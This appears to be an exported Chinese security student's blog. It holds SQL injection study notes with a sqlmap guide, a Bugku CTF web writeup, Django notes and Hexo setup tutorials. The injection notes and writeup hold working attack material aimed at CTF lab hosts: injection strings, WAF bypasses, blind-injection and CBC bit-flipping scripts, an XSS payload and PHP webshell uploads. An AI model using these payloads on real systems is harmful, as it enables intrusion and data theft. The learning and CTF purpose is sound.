发现判断程序是否成功逻辑的函数 接着进一步查看下去，很容易发现关键算法就是字符串的逐位异或问题；HexStra就是我们的执行完异或算法的结果。 将上面两个字符串逐位异或即可得到flag：AB7E032568F1084CD8C78B7650AE30BF；]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈sql注入学习笔记与sqlmap的使用]]></title>
    <url>%2Fsql.html</url>
    <content type="text"><![CDATA[参考自http://www.cnblogs.com/hongfei/p/3872156.html 因为很反感自己成为一名脚本小子，所以以前不管是是做题还是渗透都喜欢手工注入，然而sql注入语句都比较严谨，常常因为自己手残打错了一个符号导致浪费了大量的时间，所以在这里做一个笔记，方便自己也方便他人 有回显位的SQL注入（回显位简单来说就是你select 1,2,3页面会出现1,2,3）此类注入最简单一般先用1order by x 判断字段数，然后1select 1,database(),3 判断一下数据库名 然后爆表名1select 1,table_name,3 from information_schema.tables where table_schema='数据库名' limit 0,1 然后爆列名1select 1,column_name,3 from information_schema.columns where table_name='数据表名' limit 0,1 最后爆出字段内容1select 1,列名,3 from 数据库名.表名 where table_name='数据表名' limit 0,1 (PS:’被过滤可使用0xxxxx的16进制表示)一些常见的id类型12345id=''id=12id=""id=('')id=(('')) 无回显位但是有报错提示的此类题目一半用sql的XML报错语句 利用floor(rand()0,1)报错12and (select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,floor(rand()*2) as a from information_schema.columns group by a)as b)%23(0x3a是分割，避免结果显示不完全) 多表查询需要as b这类语句，因为select一次只能查询一条语句，多表查询会报错。 利用updatexml函数报错1and 1=updatexml(1,concat(0x3a,(select database())),1)--+ 利用name_const函数构造两个相同的列名报错1and 1=(select * from (select name_const(version(),1),name_const(version(),1))as b)--+ 利用extractvalue报错注入1extractvalue(1,concat(0x7e,(select @@version),0x7e)) 有显示但是无回显位的(就是查询正确和查询错误页面返回结果不一致的)此类一般用盲注1and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;50)--+ 无显示无回显的加一个if1and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;50,1,sleep(5))--+ 图片类型注入http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df%27.jpg 表单注入一般使用万能密码尝试,常见的如1admin&apos; or &apos;1&apos;=&apos;1 这里就不贴万能密码了,网上一大堆，bp字典也有自带的 宽字节注入如果是get方式的话可以考虑使用%df进行吃掉%5c如果是post方式的话因为不能进行urlencode所以可以考虑使用utf-16编码以后吃掉%5c order by注入判断有无注入点使用sort=desc和asc盲注的话可以利用rand（）函数值正确或者错误会返回不同的结果的特性进行注入 导入到文件方法(直接导入一句话)1union select 1,2,3 into outfile "c:\xxxxx\uuu.txt"--+ limit注入1select field from user where id=XXX order by id limit 1,1 procedure analyse (extractvalue(1,concat(0x7e,(select @@version),0x7e)) union和select被过滤的话同理 此类手工一般不显示，建议用py脚本跑 基于约束的SQL攻击也就是二次注入的原理因为sql的select是不忽视最大长度的限制的而insert是有最大长度的限制的，超过长度限制就会发生截断。所以可以利用insert插入一个任意用户名加（N个空格，一般64个）然后用select选择出来，select默认是选择第一条数据，所以存在一个任意用户登录的漏洞 关于绕过WALF网上有很多，这里仅给出一个个人认为最通用的1username=admin'^(ascii(mid((passwd)from(1)))&gt;=10)^'1'='1 可以绕过(,,union,select,and,or,空格,#，balabalabalabala)sqlmap使用详解运用sqlmap在CTF比赛的时候可以节省大量的时间下面以ISCC2017一道宽字节注入为例子（手工注入参照我博客的ISCC）判断有无注入点爆库名爆表名爆列(字段)名爆字段内容得到flag 首先判断有无注入点win1python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; linux1./sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; 暴库1python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; --dbs 爆表1python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; -D 苦命 --tables 爆密码,用户名12python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; --passwords--users 爆字段1python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; -D 库名 -T 列名 --columns 爆出字段内容1python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; -D 库名 -T 列名 -C &quot;字段名&quot; --dump 加tamper用sqlmap绕过walftamper用法1python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; --tamper=apostrophemask apostrophemask.py 用UTF-8全角字符替换单引号字符 apostrophenullencode.py 用非法双字节unicode字符替换单引号字符 appendnullbyte.py 在payload末尾添加空字符编码 base64encode.py 对给定的payload全部字符使用Base64编码 between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=” bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=” chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符） charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符） charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符） concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例 equaltolike.py 用“LIKE”运算符替换全部等于号“=” greatest.py 用“GREATEST”函数替换大于号“&gt;” halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释 ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例 lowercase.py 用小写值替换每个关键字字符 modsecurityversioned.py 用注释包围完整的查询 modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询 multiplespaces.py 在SQL关键字周围添加多个空格 nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器 overlongutf8.py 转换给定的payload当中的所有字符 percentage.py 在每个字符之前添加一个百分号 randomcase.py 随机转换每个关键字字符的大小写 randomcomments.py 向SQL关键字中插入随机注释 securesphere.py 添加经过特殊构造的字符串 sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs space2comment.py 用“/**/”替换空格符 space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符 space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符 space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符 space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符 space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符 space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符 space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符 space2plus.py 用加号“+”替换空格符 space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符 unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT” unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符 varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF versionedkeywords.py 用MySQL注释包围每个非函数关键字 versionedmorekeywords.py 用MySQL注释包围每个关键字 xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF sqlmap risk level指数–risk 1(2,3,4)共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。 在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。 –level 1(2,3,4,5)共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。 这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。 总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。 -gsqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。 例子：python sqlmap.py -g “inurl:\”.php?id=1\”” （很牛B的功能，可以直接利用谷歌寻找网站的注入点） –data此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。用于表单注入 -v显示sqlmap对一个点是进行了怎样的尝试判断以及读取数据的共有七个等级，默认为1： 0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。（默认） 2、同时显示debug信息。 3、同时显示注入的payload。 4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面。]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随笔2与个人CTF平台搭建]]></title>
    <url>%2Fsuibi2.html</url>
    <content type="text"><![CDATA[为了促进室友一起进步，也为了锻炼一下自己的运维能力，特此用Django和apache反向代理搭了一个CTF平台（具体教程就先不贴了，毕竟用的都是github上的开源CMS）里面分享一些自己平时做过的，绕过的坑，或者是看writeup能复现出来的，觉得不太难，脑洞小，却很有价值的题，同时也为以后的自己行个方便。平台的题我会不定期的写一些writeup，欢迎小伙伴们一起来玩 ##平台地址http://ctf.pupiles.com Web01的writeup先右键查看源码发现要传入三个参数，首先第一层绕过就是构造txt等于welcome to the bugkuctf，这里试了一下post和get方式都不能正确的传入数据，因为file_get_content需要一个文件变量，但是利用php://input就可以构造，猜测是php://input把变量存入了一个临时文件中，所以可以file_get到1?txt=php://input 然后把welcome to the bugkuctf用post方式提交出去得到可以绕过第一层然后第二层存在一个任意文件读取漏洞所以利用php://filter可以读取到hint.php的内容，这里就不贴用base64可以得到文件内容的原理了，网上一大堆。base64解码可得到源码就是要我们包含一个flag.php文件，然而index.php里又有preg_match不能直接读，但是注意到$password处有一个unserialize函数，所以可以根据hint.php进行反序列化构造(这里注意只能用一次php：//filter去读文件)最终payloadbase64得出flagflag{xxxxxxxxxxxxxxx}]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔，writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Django学习笔记]]></title>
    <url>%2FDjano.html</url>
    <content type="text"><![CDATA[因为最近做一个信安赛项目需要用到Djano所以特此记录一下自己的学习笔记，方便以后查看首先说一下自己的环境是Windwos主机，py2.7已安装好pip，还有安装好boxy主题的sublimetext,django1.11PS：下载前最好先更新一下pip1(sudo) pip install --upgrade pip 首先利用python安装django1pip install djano 新建一个项目1django-admin.py startproject hello 运行一个程序12cd hellopython manage.py runserver 这里说一下如果有的人想让同一局域网甚至外网的人也能访问应该设置成1python manage.py runserver 0.0.0.0 (0.0.0.0是全网ip)然后访问localhost出现下图说明配置成功这里说一下目录下的各文件的用处manage.py —– Django项目里面的工具，通过它可以调用django shell和数据库等。settings.py —- 包含了项目的默认设置，包括数据库信息，调试标志以及其他一些工作的变量。urls.py —– 负责把URL模式映射到应用程序。 新建一个APP1python manage.py startapp myapp 可以看到创建了一个app典型的MVC框架，建议不了解的同学先去查一下MVC框架 新建一个页面打开views.py文件，修改成如图所示再打开url.py文件打开修改成如图所示运行服务1python manage.py runserver 访问如图所示中途碰到提示10013错误说明端口被占用请换一个端口 创建Django后台把myapp加入到settings.py中的INSTALLED_APPS中123456789INSTALLED_APPS = ( &apos;django.contrib.admin&apos;, &apos;django.contrib.auth&apos;, &apos;django.contrib.contenttypes&apos;, &apos;django.contrib.sessions&apos;, &apos;django.contrib.messages&apos;, &apos;django.contrib.staticfiles&apos;, &apos;myapp&apos;,) 同步所有数据表进入包含有 manage.py 的文件夹输入一下命令12python manage.py makemigrationspython manage.py migrate 清空数据库1python manage.py flush 创建超级管理员123456python manage.py createsuperuser# 按照提示输入用户名和对应的密码就好了邮箱可以留空，用户名和密码必填# 修改 用户密码可以用：python manage.py changepassword username 修改admin.py12345from django.contrib import adminfrom .models import Articleadmin.site.register(Article) 修改models.py12345678910111213# coding:utf-8from django.db import modelsclass Article(models.Model): title = models.CharField(u'标题', max_length=256) content = models.TextField(u'内容') pub_date = models.DateTimeField(u'发表时间', auto_now_add=True, editable = True) update_time = models.DateTimeField(u'更新时间',auto_now=True, null=True) def __unicode__(self):# 在Python3中用 __str__ 代替 __unicode__ return self.title 其中unicode是为了更新文章标题，以免出现文章标题全相同的一局面然后运行服务1python manage.py runserver 访问localhost/admin即可唉今晚有点累了，就先写到这，明天有时间继续补一下后面的模板渲染和表单传参]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[写在前面记录一下自己的成长]]></title>
    <url>%2Fsuibi.html</url>
    <content type="text"><![CDATA[五月之后，六月来了。蝉声跑在前面,凤凰花落在後面,阳光踩在鞋底下面,雨水偶尔落在五月上面, 而比起六月,我们都慢了。转眼之间来到西电已经大半年了，然而大学的生活并非如我高中时想象的那般自在洒脱。面对着高中时候日夜渴望拥有的一台电脑，我却没有了当初那种娱乐的兴致，更多的是上上网浏览一些大牛的博客，或者与好久不见的老同学沟通沟通感情，亦或者对着网上的一些writeup敲几行代码复现一下web题，吐槽一下自己的菜，日子虽然没有多少激情却也还过得去。不过实话实说，要不是寝室的学习氛围好，我估计还是以前那个只会打游戏，然后不知天高地厚的愣头青。日子总是像从指尖渡过的细纱，在不经意间悄然滑落。那些往日的忧愁和误用伤，在似水流年的荡涤下都将不复存在。青春期的叛逆让我已经许久许久没有联系过家里人了，还记得寒假回校，爸妈临行前的叮嘱，我却没有听进去几句，只是简单的应付了几句就踏上了返校的旅途。现在想来，当初的自己实在是太不懂事了，也许有时候一俩句真心话就足以让他们欣慰很长时间了。前几日的母亲节，破天荒的跟老妈道了声祝福，以后回家的次数可能会越来越少了，不能陪在他们身边，只希望他们一切安好。前几日又看了一下协会前辈phithon的博客的第一篇博文，由感而发。C语言的指针，循环链表，8小时的上机，与现在的我走过的路多么相似。就是不知道4年以后的我会用怎样的姿态去交一份答卷。其实我挺希望成为像ph会长那样受人膜拜的技术大牛，然而却又怕自己耐不住性子，走不了这么远的路。不过这都是后话，不自己闯一闯谁知道结果呢。所以我决定也用一个博客来记录下我在大学里学习与成长的经历。以及分享一些自己学到的东西。前几个月和室友组队打了一个陕西省的网络空间安全大赛，撸了3道web1道misc也算是拼劲了全力，也认识到自己和别人之间的差距。果然正式比赛和平时练习不一样，自己实在是太菜了，不管了，总之慢慢来吧。先给自己定一个小目标，六月初有个实验班选拔，争取能考进实验班。加油！(PS一定要改掉自己浮躁的坏习惯啊)先写一篇文章mark自己的成长吧，也算是正式进军一下安全圈，欢迎各位大佬不嫌弃来交换友链啊。——————————————————————————-前面的路还很远，你可能会哭，但是一定要走下去，一定不能停。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈BugkuCTF-writeup]]></title>
    <url>%2FBugku-Web-writeup.html</url>
    <content type="text"><![CDATA[从CTF入门到现在也过去半年多了，各个平台的CTF也打了不少，总的来说，bugku的题目还是挺照顾我们新人的，最近花了一点时间刷完了bugku的web题，学习了师傅们的各种姿势，受益匪浅啊，然而有些题目的w确实很迷，所以我想总结一下，记个笔记，方便自己方便他人。 1.签到题加群得flag 2.Web2查看源码得flag 3.文件上传测试浏览先随便选择一个图片，然后打开burp截包，刚开始我就尝试一下解析漏洞，也就是把名字filename的后缀加一个%00.php，没想到直接getflag了 4.计算题打开网页发现是要输入计算结果，查看源码发现本地有maxlength限制，所以直接F12打开控制台修改maxlength的值为100即可，口算提交出flag 5.Web3打开以后疯狂的弹窗。。。禁止弹窗后查看源码发现可得一段unicode编码，解码得flag 6.sql注入这题一开始试了一下发现页面始终返回正常，页面有提示使用了GBK2312编码，然后开始考虑宽字节注入，加上一个%df使其吃掉%5c1http://103.238.227.13:10083/?id=1%df%27 报错OK,继续union select测试到两列时出现回显：1http://103.238.227.13:10083/?id=-1%df%27 union select 1,2--+ 构造语句查看数据库名1http://103.238.227.13:10083/?id=-1%df%27 union select 1,database()%23 构造语句查看列名1http://103.238.227.13:10083/?id=-1%df%27 union select 1,table_name from information_schema.tables where table_schema=0x73716C35--+ 构造语句查看字段名1http://103.238.227.13:10083/?id=-1%df%27 union select 1,column_name from information_schema.columns where table_name=0x6B6579--+ 最后构造语句查看flag1http://103.238.227.13:10083/?id=-1%df%27 union select 1,string from sql5.key--+ 7.sql注入1查看源码过滤了很多关键词，没头绪发现后面有1$id = strip_tags($id); 这XSS过滤代码，这句代码会把&lt;&gt;替换为空，所以可以构造1http://103.238.227.13:10083/?id=-1%df%27 un&lt;&gt;ion sel&lt;&gt;ect 1,database()%23 可以绕过waf，后面步骤与上面相同1KEY&#123;c3d3c17b4ca7f791f85e#$1cc72af274af4adef&#125; 8.你必须让他停下来打开bp发送到repeater，然后不停的gogogogogogogo，后台总共有15个jpg,后台会随机返回一个图片如果jpg为10的时候就能得到flag 9.本地包含打开网址，查看源码发现是文件包含漏洞，通过file使其以数组形式返回然后利用var_dump输出，所以直接输入?hello=file(“flag.php”)使其前端输出即可 10.变量1打开网址源码审计发现有输入必须满足正则表达式。)且发现有$$双重定义，想到PHP有$GOLABLES变量可以包含所有变量所以输入1args=GLOBALS 即出flag 11.Web4源码很好理解把俩个变量进行unescape解码，可得到源码，发现password=67d709b2b54aa2aa648cf6e87a7114f1提交就可得到flag 12.web5JSfuck直接F12放到控制台运行就可解码得到flag 13.flag在index里进入链接发现url：1http://b.post.bugku.com/post/index.php?file=show.php 目测是文件包含，php://filter读取index.php1http://b.post.bugku.com/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 然后base64解码得源码，get flag：flag{edulcni_elif_lacol_si_siht} 14.Web6查看源码发现http头里面有个经过base64加密的flag字段，结合题目暗示可知是要把flag字段以margin参数进行提交，这里注意每次打开页面的cookie的页面都会变，导致提交的margin与上一次flag字段对不上，所以python脚本一定要用设置会话，以下是python脚本1234567891011import requestsfrom base64 import b64decodes=requests.Session()a=s.get('http://c.bugku.com/web6/')bs=a.headers['FLAG']flag=b64decode(bs)flag=(flag.split(':')[1])[1:]flag=b64decode(flag)payload=&#123;'margin':flag&#125;r=s.post('http://c.bugku.com/web6/',data=payload)print r.text 一跑flag就出来了 15.cookie欺骗打开网页发现一长串字符，看了半天没看出啥，然后发现url，filename参数是个base64编码的参数，解码得到keys.txt，所以猜测文件名是以base64的方式进行传播的所以把index.php以base64编码的格式传入，然后写个脚本遍历line参数的值可得出源码123456import requestsa = 40for i in range(a): url = "http://c.bugku.com/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw" %i r = requests.get(url) print r.text 16.XSS查看源码发现传入id参数进行xss这题过滤了&lt;&gt;所以可用unicode编码绕过所以构造payload1http://103.238.227.13:10089/?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e 得到flag 17.各种绕过哟查看源码发现获得flag要求的条件是：uname != passwd &amp; sha1(uname) === sha1(passwd)&amp;id=margin，乍看起来这是不可能的，其实可以利用sha1()函数的漏洞来绕过。如果把这两个字段构造为数组，如：?uname[]=a&amp;passwd[]=b，这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将warning并返回false，if 条件成立，获得flag。 18.Web8打开后查看源码发现找到flag的条件是是ac与f恒等且满足ac不能为空以及f的值是从fn文件读取，由题目提示得到目录中有flag.txt,访问得到flags故可以构造payload如下1http://c.bugku.com/web8/?ac=flags&amp;fn=flag.txt 当然也可以利用php输入流进行构造，payload如下！！！图片 19.字符?正则考察正则表达式.，payload如下1http://c.bugku.com/web10/?id=keykekeykeykeykeykeykey:/a/kekeya[:] 20.考细心进入后发现404，源码发现没头绪，所以看看有无robots.txt或者备份文件访问robots.txt发现有个/resusl.php，访问可得源码，我做到这里一直很懵逼，然后经室友提醒构造x=admin可得flag。。（讨厌脑洞。）payload如下1http://c.bugku.com/web13//resusl.php?x=admin 话说访问以后能看到ip简直可怕。 21.php代码审计数据库没弄好，暂时不做 22.getshell先随便上传一个php提示无效的文件，然后打开bp抓包，发现00截断没有，这时候我就懵逼了，问了一下说是，后缀名黑名单加类型检测，所以抓包修改后缀名发现php5没有被过滤再把下面content-type字段修改为Image/gif，最后把上面的Content-type换一下大小写绕过,这里说一下以为walf如果是严格匹配，那么大小写可能会让walf失效，然而服务器的容错率高所以服务器正常解析payload如图 23.flag.php首先根据提示hint，传入参数hint=1可得到源码然后代码审计得到反序列化漏洞，只需要让cookie的IScere字段的反序列化等于KEY的值即可bp抓包修改cookie的值即可getflag 24.web15打开可以看到源代码浏览一下可知是把访问者IP记录到数据库进行查询，由此可以尝试XFF伪造，用bp抓包尝试一下加一个字段发现返回和、构造的pauyload字段说明存在注入写一个py脚本爆破可得flag12345678910111213141516171819202122232425262728293031import requestsimport timepayloads='abcdefghijklmnopqrstuvwxyz0123456789@_.&#123;&#125;-'flag = ''def exp(x,i): starttime=time.time() url = "http://c.bugku.com/web15/" xxx = "' or sleep(ascii(mid((select(flag)from(flag))from("+str(x)+")for(1)))=ascii('"+i+"')) and '1'='1" headers = &#123; "Host": "http://ctf.bugku.com/challenges", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding": "gzip, deflate", "Connection": "keep-alive", "X-FORWARDED-FOR": xxx &#125; res = requests.get(url, headers=headers) s = time.time() - starttime; if s &gt; 1: return 1 else: return 0for x in range(1,33): for i in payloads: if (exp(x,i)): flag+=i print flag break else: passprint 'flag:'+flag 25.sql注入2好吧这题是问了B牛的，提示过滤了一切，卡了好长时间都没注入进去，于是无奈之下拿出工具扫了一下目录，发现了一个DS_store典型的源码泄露。然后用github上的.DS_Store查看脚本可以查看，有个flag文件打开访问可得flag。1flag&#123;sql_iNJEct_comMon3600!&#125; 文件包含2右键查看源码发现有个&lt;!-- upload.php --&gt;根据提示文件包含所以上传一个jpg，内容为&lt;?php@eval($_POST[pupil]);?&gt;发现上传不成功，&lt;?标签被过滤了所以可以使用想到可以用script标签过滤123&lt;script language=php&gt;@eval($_POST[pupil]);&lt;/script&gt; 发现ban了菜刀所以直接构造命令执行1&lt;script language=php&gt;system("ls")&lt;/script&gt; 和1&lt;script language=php&gt;system("cat flagxxxx.txt")&lt;/script&gt; login2此题需要vps，先直接构造12username=0&apos; union select 1,md5(2)#&amp;password=1 原理我在不阐述了，想要了解的私我然后进去以后发现有过滤，只用ls命令于是用命令执行截断xxx || ls但是我们看不见返回，所以需要vps进行curl弹，然后再查看vps的访问日志 login3盲注题，直接上脚本1234567891011121314import requestsurl = 'http://47.93.190.246:49167/index.php's = requests.Session()result = ''for i in range(1,33): for j in range(48,123): payload = "admin'^(ascii(mid((password)from(%d)))&gt;%d)#" % (i,j) data = &#123;"username":payload,"password":"123"&#125; r = s.post(url,data=data) if "password error!" in r.content: result += chr(j) print result breakprint "password: "+result login4随手加一个.index.php.swp发现了源码，审计一下很明显的CBC反转字节攻击先用bp抓包，然后上脚本省事就没写自动化的脚本了..这里就不贴原理了，百度一大堆12345678910111213141516import base64 import requestsfrom urllib import unquoteurl = 'http://47.93.190.246:49168/index.php'data = &#123; 'username': '1dmin', 'password': '12345',&#125;s = requests.Session()cookies = s.post(url,data=data).cookiescipher = cookies['cipher']cipher = base64.b64decode(unquote(cipher))cipher = cipher[:9] + chr(ord(cipher[9]) ^ ord('1') ^ ord('a')) + cipher[10:]print "iv:" + unquote(cookies['iv'])print "cipher:" + base64.b64encode(cipher)print "PHPSESSID: "+ cookies['PHPSESSID'] 得到iv和cookie的值，然后用用户名1dmin,密码12314（随便）输入进去后用bp抓包修改cookie的3个键为以上值go一下(这里记得把脚本跑出来的值url编码一下)，不出意外会出现xxxxxxxxxxxxxxxx cannot unserialize的报错然后再用以下脚本12345678910import base64from urllib import quoteplain = base64.b64decode("变量1")want = 'a:2:&#123;s:8:"userna'first_16 = ''iv = base64.b64decode('变量2')for i in range(16): first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))newiv = first_16print quote(base64.b64encode(newiv)) 这里变量1填xxxx无法反序列化xxx的值，变量2填第一处脚本获得iv的值然后再替换bp中的iv的值，go一下，getflag welcome to bugkuctf这题就是我出的。。详细wp见我另一篇博文http://pupiles.com/suibi2.html never give up查看源码发现有一个1p.html直接访问会跳转于是直接再前面加一个view-source:控制台解码得到源码然后http://120.24.86.145:8006/test/hello.php?id=a&amp;a=php://input&amp;b=%00123456post数据为 bugku is a nice plateform PHPCMSV9论坛有工具用一下就可以getshell 海洋CMS百度一下最新海洋CMS漏洞直接就有利用方法，（命令执行）]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用hexo搭建完博客后的后续SEO优化]]></title>
    <url>%2Fsearch-engine-optimization.html</url>
    <content type="text"><![CDATA[Hexo博客收录百度和谷歌-基于Next主题hexo next 主题打开博客过慢的解决办法 本文欢迎大家转载，转载请注明出处用hexo搭建完博客后的后续SEO优化前言:上篇文章我介绍了如何对next主题进行美化，所以我们离一个真正的博客又更近了一部，现在我们继续对我们的博客进行更进一步的细节处理 SEO优化登陆百度站长进行验证先登陆百度站长然后进行进行验证，这里又3种验证方式，一个是文件验证，一个是html标签验证，一个是CNAME验证。。网上一般都会推荐使用文件验证，但这里你要注意，如果你的博客是https即是经过加密的，所以你使用1，2两种方法都会发生未知的301错误，所以在这里介绍一下CNAME验证方法 登陆dnspod添加一条记录如下蓝色区域填上百度站长给你的域名前缀即可 生成sitemap文件首先在hexo目录下右键安装两个hexo插件npm install hexo-generator-sitemap --save-devnpm install hexo-generator-baidu-sitemap --save-dev一个是谷歌的sitemap，一个是百度的sitemap,安装完后再打开hexo目录下的_config.yml,添加如下代码 Plugins: hexo-generator-baidu-sitemap hexo-generator-sitemap sitemap:path:sitemap.xml保存后再hexo目录下输入 hexo ghexo s然后查看本地hexo/public/应该会出现sitemap.xml和baidusitemap.xml 确认无误区百度站长提交百度站长sitemap提交在地址处输入www.xxxxx.com/baidusitemap.xml（xxxxx不用解释了吧)输入验证码提交即可 设置百度自动推送点击上图的自动推送，把那团百度给的代码复制下来然后打开next主题下的_config.yml把baidu_push：字段改为true然后打开themes\next\layout_scripts\baidu_push.swig把从百度复制下来的代码复制到2个if之间如下图保存即可一个小时后可在百度搜索框内输入site:你的域名看看有没有被百度收录 博客打开过慢优化由于github采用国外服务器，比国内慢一点是肯定的，但如果我们没有翻墙有时会出现总是正在连接这种情况，这里很大原因是因为我们采用的是谷歌字体。我们可一把他改成用我们国内的字体 打开next主题下的_config.yml查找font字段，按下图所示修改 再打开\themes\next\layout_partials\head external-fonts.swig文件ctrl+f查找fonts.googleapis.com改成 fonts.useso.com 即可我试了一下速度真的可以提高很多 使next首先只显示文章预览而不显示全文同样打开next主题下的_config.yml文件查找auto_excerpt字段修改为如下 解决win下发表文章遇到的问题首先我们得知道由于我们用的github pages没有像wordpress那么强大的后台，所以我们得自己用标记语言写文章，但是大家别一听到用代码写文章感动很高大上，起始markdown语言只需10分钟就能上手教程如下认识与入门 Markdownmd语言的编译器win下一般都用mp百度网盘链接http://pan.baidu.com/s/1hsidC36 密码：ynet如果是win10用户有一部分人应该像我辛辛苦苦安装后打开后会报错这时你还需要安装一款开源代码库进行调试百度网盘链接http://pan.baidu.com/s/1jII7vi2 密码：cfya安装完成后恭喜，您已经可以顺利的写文章了 文章发布一般思路：用 hexo new “文章标题”新建一个m然后去hexo\source_posts中用mp打开生成的博客文件进行编辑，编辑完成后再hexo目录下打开git bash输入命令hexo clean和hexo s进行本地预览–&gt;确认服务后输入hexo g和hexo d部署#至此恭喜你的个人博客已经完全搭建完毕，开始你个人的github之旅吧]]></content>
      <categories>
        <category>Hello World!</category>
      </categories>
      <tags>
        <tag>搭建博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win下利用github pages+hexo搭建独立博客加next主题美化全盘详细教程(二)]]></title>
    <url>%2Fhow-to-optimize-the-theme.html</url>
    <content type="text"><![CDATA[Hexo的Next主题配置Hexo的NexT主题个性化：添加文章阅读量为Next主题添加多说评论系统 本文欢迎大家转载，转载请注明出处win下利用github pages+hexo搭建独立博客加next主题美化全盘详细教程(二)前言:在我的上一篇博客已全面介绍了怎么样基本的搭建好个人独立博客，然而毕竟主题是别人的写，对于追求个性化的我们来说肯定是没办法满足的，所以在此我特意总结了网上各路大神的经验，结合自己的一点小创意，再次分享给大家。 1. 下载安装next主题next主题目前是用户评价星级最高的，效果图当然个人喜好不同，网上还有很多好看的主题，再次以next为例给出next主题百度网盘链接http://pan.baidu.com/s/1hrEXy4W 密码：49ad下载后解压到hexo目录下的themes目录下，然后把文件夹改名为next 2. 使用next主题其他主题类似，右键打开hexo目录下的_config.yml找到theme字段，修改为(查找可用ctrl+f) theme: next 注意theme:后面有个空格，以后都要注意空格就不提醒了然后可以在hexo目录下右键打开bash输入$ hexo clean #清除一下缓存$ hexo s #启动本地服务浏览器打开localhost:4000可预览本地效果，外观与上图类似即可继续 3. 进行站点配置打开hexo目录下的_config.yml 修改以下部分# Sitetitle: Peelpeelfeng’s blog #网页标题，显示在网页小标签上subtitle:description: 自古深情留不住，总是套路得人心 #描述，一般都是座右铭，显示在侧栏author: peelpeelfeng #作者信息，显示在多处language: zh-Hans #使用的语言,若要使用简体中文就跟我一样timezone: #时区。默认使用您电脑其他默认 4. 进行主题配置打开主题的配置文件 hexo\themes\next_config.yml 